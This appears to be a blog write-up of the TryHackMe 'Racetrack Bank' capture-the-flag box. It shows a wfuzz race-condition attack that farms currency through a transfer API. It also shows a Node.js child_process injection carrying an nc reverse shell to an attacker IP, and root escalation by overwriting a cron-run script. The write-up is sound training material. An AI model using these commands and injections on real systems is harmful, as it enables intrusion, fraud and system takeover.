---
layout: post
title: Racetrack Bank | Writeup
categories: CTF
author: ThelastVvV
date: '2020-07-14 05:00:53 +0000'
tags:
  - CTF
  - CyberSecurity
  - TryHackMe
published: true
---
- [Racetrack Bank](#racetrack-bank)
- [Enumeration](#enumeration)
- [Exploitation](#exploitation)
- [Reverse shell](#reverse-shell)
- [Flags](#flags)

<!-- toc -->


### Racetrack Bank
Hallå gubbar, this one is a lil bit difficult but hey we can do it specially if you want to learn more and practice on race condition vulnerabilities ... check the box  Racetrack Bank

### Enumeration


After we scan using Nmap we found 80 port open = http

```sh
http:/ip-box:80
```




then it will redirect you to the login page
we found other 2 pages 
give gold ( to send gold to other users) / purchase (buy premium ) 





We also have 1 gold ....

Nothing else so what we need to do is find out the premium features but how is that ?

Drom the description and title of the box is possible to say that there's race conditions vulnerabilities 

so let fuzz it!!

### Exploitation

How ?
we need to fuzz and send multi requests to transfer gold from an account to an other 
Result:
Farming gold 

What we need ?

1. Creating accounts
2. Cookies id tag
3. Loop requests
4. Buy premium


i will try to make it easy for you 

1. create account ( test22 ) also create an other account in private tab (test99)

we need to intercept the gold transfer request using BURPYYY...


2. Now we got cookie id tag (request)

3. Loop requests in this case we will use wfuzz 

but first create txt file and each line should have number 1 ( 1 gold remember ) and you should have 20 000 line 

" Dont worry i said i will make it easy for you "

https://pastebin.com/MxnwWnWG

 command :
 
```sh
wfuzz -w /root/Desktop/gold.txt -u http://Box-ip/api/givegold -H "Content-Type: application/x-www-form-urlencoded" -b "Cookie ID" -d "user=test99&amount=FUZZ"
```


| Options      | Meaning       |
| ------------- |:-------------:|
|-w| wordlist|
|-u| url|
|-H |header|
|-b |cookie|
|-d |postdata |

So don't waste too much time going back from an account t oan other 

just once you reach 600 gold change 1 gold to 6 gold in text file 

also send gold from account test22 to test99 

also send back 600 from test99 without fuzzing it 

then go back to test22 and fuzz it again 

4. so in 3 steps you will have more 10k gold enough to buy premium !



### Reverse shell

To be frank i tried many injections command but nothing worked until checked source code (node.js)

so just google node.js reverse shell


```sh
http://Ip-box/premuimfeatures.html?ans=require("child_process").exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR-IP PORT >/tmp/f')
```

voila!




### Flags

we got the user flag :
```sh
~$ cat  user.txt
```
Now we need to privesc to root but i'm lazy specially late nights so just searched for backup files and we find 
```sh/cleanup/```file called ```cleanupscript.sh``` that runs every minute.

So we can optin to get second reverse shell as root or copy and output root flag
 
so you either 
```sh 
rm cleanupscript.sh
```  
or
```sh
mv cleanupscript.sh > cleanupscript.sh.backup ( check dogcat room similar)
```

then
```sh
echo 'cat /root/root.txt > /home/brian/root_flag.txt' > cleanupscript.sh
```
```sh
chmod 777 cleanupscript.sh
```

Run it and wait 1 min then check for for output


See you next time ......

